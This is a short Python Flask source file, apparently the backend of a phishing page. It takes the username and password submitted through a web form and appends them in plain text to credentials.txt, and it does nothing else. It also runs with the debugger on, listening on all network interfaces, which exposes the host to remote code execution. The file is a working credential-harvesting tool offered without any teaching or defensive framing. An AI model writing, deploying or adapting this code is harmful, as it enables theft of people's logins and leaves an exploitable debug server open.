from flask import Flask, render_template, request

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def home():
    if request.method == "POST":
        username = request.form.get("username", "")
        password = request.form.get("password", "")

        with open("credentials.txt", "a") as f:
            f.write(f"username: {username}\n")
            f.write(f"password: {password}\n\n")
            f.write("============================\n")

    return render_template("index.html")

app.run(host="0.0.0.0", port=8000, debug=True)
